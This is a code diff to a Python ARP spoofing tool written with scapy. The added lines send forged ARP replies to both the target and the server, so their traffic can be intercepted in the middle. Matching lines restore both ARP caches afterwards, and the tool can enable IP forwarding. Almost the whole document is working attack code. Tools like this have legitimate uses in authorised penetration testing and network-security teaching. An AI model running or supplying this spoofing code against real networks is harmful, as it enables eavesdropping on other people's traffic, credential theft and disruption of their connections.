@@ -1,7 +1,6 @@
 from scapy.all import Ether, ARP, srp, send
 import time
 import os
-import sys
 
 service = 0
 if os.name == "nt":
@@ -20,11 +19,19 @@ class ARP_Spoofer:
         send(arp_res, verbose=0)
         if self.options["verbose"] == "yes":
             print("[+] Sent to {} : {} is at {}".format(self.options["target_ip"], self.options["server_ip"], ARP().hwsrc))
+        arp_res = ARP(pdst=self.options["server_ip"], hwdst=self.macs[1], psrc=self.options["target_ip"], op='is-at')
+        send(arp_res, verbose=0)
+        if self.options["verbose"] == "yes":
+            print("[+] Sent to {} : {} is at {}".format(self.options["server_ip"], self.options["target_ip"], ARP().hwsrc))
+
     def restore(self):
         arp_res = ARP(pdst=self.options["target_ip"], hwdst=self.macs[0], psrc=self.options["server_ip"], hwsrc=self.macs[1])
         send(arp_res, verbose=0, count=7)
         if self.options["verbose"] == "yes":
             print("Restoring...")
+        arp_res = ARP(pdst=self.options["server_ip"], hwdst=self.macs[1], psrc=self.options["target_ip"], hwsrc=self.macs[0])
+        send(arp_res, verbose=0, count=7)
+
     def start_spoofing(self):
         if self.options["forward_packets"] == "yes":
             # We need to enable port forwarding
@@ -39,3 +46,4 @@ class ARP_Spoofer:
             else:
                 with open("/proc/sys/net/ipv4/ip_forward", 'w') as f:
                     print(0, file=f)
+
